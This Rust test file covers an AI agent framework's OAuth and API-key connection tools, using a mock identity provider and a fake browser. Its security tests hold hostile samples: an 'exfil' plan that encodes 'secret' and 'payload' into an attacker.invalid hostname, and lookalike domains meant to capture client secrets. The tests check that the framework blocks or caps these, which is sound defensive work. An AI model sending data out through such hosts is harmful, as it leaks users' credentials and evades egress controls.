//! auth_propose and connection_add end to end: the choice card, the
//! sign-in card answered by a fake browser, registration, the same account
//! twice, a key, and nobody there.
#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::sync::{Arc, Mutex};

use async_trait::async_trait;
use serde_json::{Value, json};
use tern_auth::tools::{AuthHost, AuthPropose, ConnectionAdd, Target, Targets};
use tern_auth::{AuthPlan, ClientKind, Connections, Guard, Kind, Source, Tokens};
use tern_core::approval::{
    ApprovalHandler, ApprovalRequest, AuthCard, AuthPrompt, Decision, SecretRequest, SecretValues,
};
use tern_core::config::AuthConfig;
use tern_core::tool::{Tool, ToolCtx};
use tokio_util::sync::CancellationToken;
use wiremock::matchers::{body_string_contains, header, method, path};
use wiremock::{Mock, MockServer, ResponseTemplate};

/// Answers choice cards with `choice`, follows sign-in pages like a
/// browser whose user approves, and types `keys` into secret prompts.
struct User {
    choice: Option<&'static str>,
    keys: SecretValues,
    cards: Mutex<Vec<AuthPrompt>>,
}

#[async_trait]
impl ApprovalHandler for User {
    async fn ask(&self, _: &ApprovalRequest) -> Decision {
        Decision::Deny
    }

    async fn ask_secrets(&self, _: &SecretRequest) -> Option<SecretValues> {
        Some(self.keys.clone())
    }

    async fn ask_auth(&self, req: &AuthPrompt) -> Option<String> {
        self.cards.lock().unwrap().push(req.clone());
        match &req.card {
            AuthCard::Choose { .. } => self.choice.map(str::to_owned),
            AuthCard::SignIn { url: Some(url), .. } => {
                let u = reqwest::Url::parse(url).unwrap();
                let q = |k: &str| {
                    u.query_pairs()
                        .find(|(n, _)| n == k)
                        .unwrap()
                        .1
                        .into_owned()
                };
                let back = format!("{}?code=the-code&state={}", q("redirect_uri"), q("state"));
                tokio::spawn(async move { reqwest::get(back).await });
                // The card stays open until the sign-in closes it.
                std::future::pending().await
            }
            AuthCard::SignIn { .. } => None,
        }
    }
}

fn user(choice: Option<&'static str>) -> Arc<User> {
    Arc::new(User {
        choice,
        keys: SecretValues::new(),
        cards: Mutex::default(),
    })
}

fn ctx() -> ToolCtx {
    ToolCtx {
        workspace: std::env::temp_dir(),
        run_id: "r".into(),
        session_id: "s".into(),
        cancel: CancellationToken::new(),
    }
}

async fn idp() -> MockServer {
    let s = MockServer::start().await;
    Mock::given(method("POST"))
        .and(path("/register"))
        .respond_with(ResponseTemplate::new(201).set_body_json(json!({"client_id": "dyn-1"})))
        .mount(&s)
        .await;
    // Three sign-ins: two accounts, then the first one again.
    for (n, token) in ["AT-1-aaaa", "AT-2-bbbb", "AT-3-cccc"].iter().enumerate() {
        Mock::given(method("POST"))
            .and(path("/token"))
            .and(body_string_contains("code_verifier="))
            .and(body_string_contains("client_id=dyn-1"))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                "access_token": token, "token_type": "Bearer", "refresh_token": format!("RT-{n}-zzzz")
            })))
            .up_to_n_times(1)
            .with_priority(n as u8 + 1)
            .mount(&s)
            .await;
    }
    for (token, email) in [
        ("AT-1-aaaa", "me@work.com"),
        ("AT-2-bbbb", "me@gmail.com"),
        ("AT-3-cccc", "me@work.com"),
    ] {
        Mock::given(method("GET"))
            .and(path("/userinfo"))
            .and(header("authorization", format!("Bearer {token}").as_str()))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({"email": email})))
            .mount(&s)
            .await;
    }
    s
}

fn plan(s: &MockServer) -> AuthPlan {
    AuthPlan {
        method: "oauth2".into(),
        service: "Acme".into(),
        source: Some(Source::McpMetadata),
        provider: "acme".into(),
        issuer: Some(s.uri()),
        authorize_url: Some(format!("{}/authorize", s.uri())),
        token_url: Some(format!("{}/token", s.uri())),
        userinfo_url: Some(format!("{}/userinfo", s.uri())),
        registration_url: Some(format!("{}/register", s.uri())),
        pkce: vec!["S256".into()],
        client: Some(ClientKind::DynamicRegistration),
        client_ready: true,
        scopes_supported: vec!["read".into()],
        api_hosts: vec!["127.0.0.1".into()],
        verified: true,
        ..AuthPlan::default()
    }
}

struct Env {
    _dir: tempfile::TempDir,
    host: Arc<AuthHost>,
    conns: Arc<Connections>,
    targets: Targets,
}

fn env(s: &MockServer) -> Env {
    let dir = tempfile::tempdir().unwrap();
    let secrets = tern_core::Secrets::load(&dir.path().join("secrets.toml")).unwrap();
    let cfg = AuthConfig {
        local_issuers: vec![s.uri()],
        sign_in_timeout_secs: 20,
        ..AuthConfig::default()
    };
    let tokens = Arc::new(Tokens::new(secrets, Guard::new(&cfg.local_issuers)));
    let conns = Arc::new(Connections::new(
        tern_store::Store::open_in_memory().unwrap(),
        tokens,
        10,
    ));
    let targets: Targets = Arc::new(|| {
        vec![
            Target {
                kind: Kind::Mcp,
                name: "acme".into(),
                key_names: vec![],
                oauth: None,
                hosts: vec!["127.0.0.1".into()],
            },
            Target {
                kind: Kind::Connector,
                name: "keyed".into(),
                key_names: vec!["API_KEY".into()],
                oauth: None,
                hosts: vec!["api.keyed.example".into()],
            },
            Target {
                kind: Kind::Connector,
                name: "notion".into(),
                key_names: vec![],
                oauth: None,
                hosts: vec!["api.notion.com".into()],
            },
        ]
    });
    Env {
        _dir: dir,
        host: Arc::new(AuthHost::new(&cfg)),
        conns,
        targets,
    }
}

fn parse(out: &tern_core::tool::ToolResult) -> Value {
    assert!(!out.is_error, "{}", out.content);
    serde_json::from_str(&out.content).unwrap()
}

#[tokio::test]
async fn the_user_chooses_then_signs_in_twice_and_again() {
    let s = idp().await;
    let e = env(&s);
    let u = user(Some("oauth"));
    let id = e.host.plans.keep(plan(&s));
    let propose = AuthPropose {
        host: e.host.clone(),
        asker: u.clone(),
        targets: e.targets.clone(),
    };
    let v = parse(&propose.call(&ctx(), json!({"plan_id": id})).await);
    assert_eq!(v["choice"], "oauth");
    {
        let cards = u.cards.lock().unwrap();
        let AuthCard::Choose {
            title,
            options,
            notes,
        } = &cards[0].card
        else {
            panic!()
        };
        assert_eq!(title, "Connect Acme");
        assert_eq!(options[0].id, "oauth");
        assert!(options[0].recommended && options[0].detail.starts_with("No keys to copy"));
        assert!(
            notes.iter().any(|n| n.contains("metadata (verified)")),
            "{notes:?}"
        );
    }

    let add = ConnectionAdd::new(
        e.host.clone(),
        e.conns.clone(),
        u.clone(),
        e.targets.clone(),
    );
    let v = parse(
        &add.call(&ctx(), json!({"target": "acme", "plan_id": id}))
            .await,
    );
    assert_eq!(
        (v["status"].as_str(), v["connection"].as_str()),
        (Some("connected"), Some("default"))
    );
    assert_eq!(v["account"], "me@work.com");
    assert!(
        !v.to_string().contains("AT-1"),
        "the model never sees a token"
    );
    let secrets = e.conns.tokens.secrets();
    assert_eq!(
        secrets
            .get("conn/mcp:acme/default/oauth/access_token")
            .as_deref(),
        Some("AT-1-aaaa")
    );

    // Another account: its own registration, its own tokens, a slug from
    // its email.
    let v = parse(
        &add.call(&ctx(), json!({"target": "acme", "plan_id": id}))
            .await,
    );
    assert_eq!(
        (v["status"].as_str(), v["connection"].as_str()),
        (Some("connected"), Some("me"))
    );
    assert_eq!(
        secrets
            .get("conn/mcp:acme/me/oauth/access_token")
            .as_deref(),
        Some("AT-2-bbbb")
    );
    let regs = s
        .received_requests()
        .await
        .unwrap()
        .iter()
        .filter(|r| r.url.path() == "/register")
        .count();
    assert_eq!(regs, 2, "registration is per account");

    // The first account again: reconnected, not a duplicate.
    let v = parse(
        &add.call(
            &ctx(),
            json!({"target": "acme", "plan_id": id, "connection": "third"}),
        )
        .await,
    );
    assert_eq!(
        (v["status"].as_str(), v["connection"].as_str()),
        (Some("reconnected"), Some("default"))
    );
    assert_eq!(e.conns.list(Kind::Mcp, "acme").len(), 2);
    assert_eq!(
        secrets
            .get("conn/mcp:acme/default/oauth/access_token")
            .as_deref(),
        Some("AT-3-cccc")
    );
    // Every sign-in card named the target and carried the real sign-in URL.
    let cards = u.cards.lock().unwrap();
    for c in cards.iter().skip(1) {
        let AuthCard::SignIn { title, url, .. } = &c.card else {
            panic!()
        };
        assert!(title.starts_with("Sign in to acme"), "{title}");
        assert!(
            url.as_deref()
                .unwrap()
                .starts_with(&format!("{}/authorize?", s.uri()))
        );
    }
}

#[tokio::test]
async fn a_key_is_entered_privately_per_account() {
    let s = idp().await;
    let e = env(&s);
    let u = Arc::new(User {
        choice: None,
        keys: SecretValues::from([(
            "conn/connector:keyed/work/API_KEY".to_owned(),
            " k-123456 ".to_owned(),
        )]),
        cards: Mutex::default(),
    });
    let add = ConnectionAdd::new(e.host.clone(), e.conns.clone(), u, e.targets.clone());
    let v = parse(
        &add.call(
            &ctx(),
            json!({"target": "keyed", "connection": "work", "method": "key"}),
        )
        .await,
    );
    assert_eq!(v["status"], "connected");
    assert_eq!(
        e.conns
            .tokens
            .secrets()
            .get("conn/connector:keyed/work/API_KEY")
            .as_deref(),
        Some("k-123456")
    );
    let c = e.conns.get(Kind::Connector, "keyed", "work").unwrap();
    assert_eq!(c.auth.method(), "key");
}

#[tokio::test]
async fn nobody_there_skips_and_researched_lookalikes_are_refused() {
    let s = idp().await;
    let e = env(&s);
    let nobody = user(None);
    let id = e.host.plans.keep(plan(&s));
    let propose = AuthPropose {
        host: e.host.clone(),
        asker: nobody.clone(),
        targets: e.targets.clone(),
    };
    let v = parse(&propose.call(&ctx(), json!({"plan_id": id})).await);
    assert_eq!(v["choice"], "none");
    let add = ConnectionAdd::new(
        e.host.clone(),
        e.conns.clone(),
        Arc::new(tern_core::approval::AutoDeny),
        e.targets.clone(),
    );
    let v = parse(
        &add.call(&ctx(), json!({"target": "acme", "plan_id": id}))
            .await,
    );
    assert_eq!(v["status"], "skipped");
    assert!(e.conns.list(Kind::Mcp, "acme").is_empty());

    // A plan the agent researched, with a token URL on another domain.
    let bad = propose
        .call(
            &ctx(),
            json!({"plan": {
                "service": "Notion",
                "authorize_url": "https://api.notion.com/v1/oauth/authorize",
                "token_url": "https://notion-login.com/oauth/token",
                "api_hosts": ["api.notion.com"]
            }}),
        )
        .await;
    assert!(
        bad.is_error && bad.content.contains("can't be used"),
        "{}",
        bad.content
    );
    assert!(
        nobody.cards.lock().unwrap().len() == 1,
        "no card for a refused plan"
    );

    // No OAuth: a key, with no card to answer.
    let id = e.host.plans.keep(AuthPlan {
        method: "unknown".into(),
        ..AuthPlan::default()
    });
    let v = parse(&propose.call(&ctx(), json!({"plan_id": id})).await);
    assert_eq!(v["choice"], "key");
    // connection_add can't swap the user's choice.
    e.host.plans.choose(&id, "key");
    let swapped = add
        .call(
            &ctx(),
            json!({"target": "acme", "plan_id": id, "method": "oauth"}),
        )
        .await;
    assert!(
        swapped.is_error && swapped.content.contains("chose"),
        "{}",
        swapped.content
    );
}

/// Security fix 1: a researched plan is an outbound request to a host the
/// agent chose (with whatever it encodes in the host and path), so it is
/// egress for the tainted host limit, never reachable from a script, and
/// capped per run.
#[tokio::test]
async fn researched_plans_are_egress_and_capped() {
    use tern_core::tool::Effect;
    let s = idp().await;
    let e = env(&s);
    let u = user(Some("oauth"));
    let propose = AuthPropose {
        host: e.host.clone(),
        asker: u.clone(),
        targets: e.targets.clone(),
    };
    let exfil = json!({"plan": {
        "service": "Acme",
        "issuer": "https://c2VjcmV0.attacker.invalid/cGF5bG9hZA",
        "authorize_url": "https://c2VjcmV0.attacker.invalid/authorize",
        "token_url": "https://c2VjcmV0.attacker.invalid/token",
        "api_hosts": ["api.attacker.invalid"]
    }});
    // The host the metadata fetch goes to is what the taint check sees.
    assert_eq!(
        propose.egress_host(&exfil).as_deref(),
        Some("c2vjcmv0.attacker.invalid")
    );
    let mut no_issuer = exfil.clone();
    no_issuer["plan"].as_object_mut().unwrap().remove("issuer");
    assert_eq!(
        propose.egress_host(&no_issuer).as_deref(),
        Some("c2vjcmv0.attacker.invalid")
    );
    // A kept plan fetches nothing.
    assert_eq!(propose.egress_host(&json!({"plan_id": "plan_x"})), None);

    for tool in ["auth_discover", "auth_propose", "connection_add"] {
        assert!(
            !tern_core::script::callable_in_scripts(tool, Effect::Read),
            "{tool} is offered to scripts"
        );
    }

    // A run can't loop it: past the cap, nothing is fetched or shown.
    let c = ctx();
    for _ in 0..tern_auth::tools::MAX_PROPOSALS_PER_RUN {
        let out = propose.call(&c, json!({"plan_id": "plan_gone"})).await;
        assert!(out.content.contains("no plan"), "{}", out.content);
    }
    let out = propose.call(&c, exfil.clone()).await;
    assert!(
        out.is_error && out.content.contains("proposed enough"),
        "{}",
        out.content
    );
    assert!(u.cards.lock().unwrap().is_empty());
    // Another run has its own allowance.
    let other = ToolCtx {
        run_id: "r2".into(),
        ..ctx()
    };
    let id = e.host.plans.keep(plan(&s));
    let v = parse(&propose.call(&other, json!({"plan_id": id})).await);
    assert_eq!(v["choice"], "oauth");
}

/// Security fix 2: the user's OAuth app for a provider goes only to that
/// provider's endpoints. A server whose name happens to match (a
/// `slack.pages.dev` site, or a plan the agent names "slack") never gets
/// its client ID or secret.
#[tokio::test]
async fn a_configured_app_is_bound_to_its_issuer() {
    use tern_core::config::OAuthClientConfig;
    let mut cfg = AuthConfig::default();
    cfg.clients.insert(
        "slack".into(),
        OAuthClientConfig {
            client_id: "slack-app".into(),
            client_secret_secret: Some("SLACK_CLIENT_SECRET".into()),
            issuer: None,
        },
    );
    cfg.clients.insert(
        "acme_example".into(),
        OAuthClientConfig {
            client_id: "acme-app".into(),
            client_secret_secret: Some("ACME_CLIENT_SECRET".into()),
            issuer: Some("https://login.acme.example".into()),
        },
    );
    let host = AuthHost::new(&cfg);
    let config = |provider: &str, base: &str| {
        AuthPlan {
            method: "oauth2".into(),
            provider: provider.into(),
            authorize_url: Some(format!("{base}/authorize")),
            token_url: Some(format!("{base}/token")),
            ..AuthPlan::default()
        }
        .oauth_config("", vec![])
        .unwrap()
    };

    // Named "slack", on someone's pages.dev site: refused, nothing filled.
    let mut evil = config("slack", "https://slack.pages.dev");
    let err = host.client(&mut evil, None).unwrap_err();
    assert!(err.contains("bound to"), "{err}");
    assert!(evil.client_id.is_empty() && evil.client_secret_secret.is_none());
    // Slack's own endpoints (the built-in profile's) get it.
    let p = tern_auth::profiles::by_id("slack").unwrap();
    let mut real = AuthPlan {
        method: "oauth2".into(),
        provider: "slack".into(),
        authorize_url: Some(p.authorize_url.into()),
        token_url: Some(p.token_url.into()),
        revocation_url: p.revocation_url.map(Into::into),
        ..AuthPlan::default()
    }
    .oauth_config("", vec![])
    .unwrap();
    host.client(&mut real, None).unwrap();
    assert_eq!(real.client_id, "slack-app");
    assert_eq!(
        real.client_secret_secret.as_deref(),
        Some("SLACK_CLIENT_SECRET")
    );
    // A token endpoint elsewhere, with a real authorize page, is refused too.
    let mut split = real.clone();
    split.client_id.clear();
    split.client_secret_secret = None;
    split.token_url = "https://slack.pages.dev/token".into();
    assert!(host.client(&mut split, None).is_err());
    assert!(split.client_secret_secret.is_none());

    // A non-built-in app is bound to the issuer it names.
    let mut ok = config("acme_example", "https://login.acme.example");
    host.client(&mut ok, None).unwrap();
    assert_eq!(ok.client_id, "acme-app");
    let mut lookalike = config("acme_example", "https://login.acme.example.attacker.net");
    assert!(host.client(&mut lookalike, None).is_err());

    // Metadata from slack.pages.dev is its own provider, not "slack", and
    // isn't treated as having the user's app.
    let plan = tern_auth::discover::plan_from_metadata(
        "Slack",
        &json!({
            "issuer": "https://slack.pages.dev",
            "authorization_endpoint": "https://slack.pages.dev/authorize",
            "token_endpoint": "https://slack.pages.dev/token",
        }),
        &host.clients,
        Source::WellKnown,
    )
    .unwrap();
    assert_eq!(plan.provider, "slack_pages_dev");
    assert!(!plan.client_ready);
}

/// Security fix 3: a researched plan's endpoints are checked against API
/// hosts, so those must be the ones the connector or MCP server declares,
/// not hosts the agent picked to match its own endpoints.
#[tokio::test]
async fn plans_are_checked_against_the_targets_declared_hosts() {
    let s = idp().await;
    let e = env(&s);
    let u = user(Some("oauth"));
    let propose = AuthPropose {
        host: e.host.clone(),
        asker: u.clone(),
        targets: e.targets.clone(),
    };
    // Endpoints and api_hosts all on the attacker's domain: consistent
    // with each other, so domain checks alone would pass it.
    let attacker = json!({
        "service": "Notion",
        "authorize_url": "https://login.attacker.invalid/authorize",
        "token_url": "https://login.attacker.invalid/token",
        "api_hosts": ["api.attacker.invalid"]
    });
    // For a connector that declares api.notion.com: refused before any fetch.
    let out = propose
        .call(&ctx(), json!({"plan": attacker, "target": "notion"}))
        .await;
    assert!(
        out.is_error && out.content.contains("doesn't declare"),
        "{}",
        out.content
    );
    // With no target to check against, an unconfirmed plan is refused.
    let out = propose.call(&ctx(), json!({"plan": attacker})).await;
    assert!(
        out.is_error && out.content.contains("pass `target`"),
        "{}",
        out.content
    );
    assert!(u.cards.lock().unwrap().is_empty(), "no card was shown");

    // connection_add checks a kept plan the same way: an attacker plan
    // that slipped in (or an MCP server's plan) can't sign in a connector
    // that declares other hosts.
    let add = ConnectionAdd::new(
        e.host.clone(),
        e.conns.clone(),
        u.clone(),
        e.targets.clone(),
    );
    let mut foreign = plan(&s);
    foreign.api_hosts = vec!["api.attacker.invalid".into()];
    let id = e.host.plans.keep(foreign);
    let out = add
        .call(
            &ctx(),
            json!({"target": "acme", "plan_id": id, "method": "oauth"}),
        )
        .await;
    assert!(
        out.is_error && out.content.contains("doesn't declare"),
        "{}",
        out.content
    );
    // A built-in profile isn't an MCP server's sign-in.
    let google = tern_auth::discover::from_profile(
        tern_auth::profiles::by_id("google").unwrap(),
        &e.host.clients,
        vec![],
    );
    let id = e.host.plans.keep(google);
    let out = add
        .call(
            &ctx(),
            json!({"target": "acme", "plan_id": id, "method": "oauth"}),
        )
        .await;
    assert!(
        out.is_error && out.content.contains("MCP server"),
        "{}",
        out.content
    );
    assert!(e.conns.list(Kind::Mcp, "acme").is_empty());
    assert!(u.cards.lock().unwrap().is_empty());
}
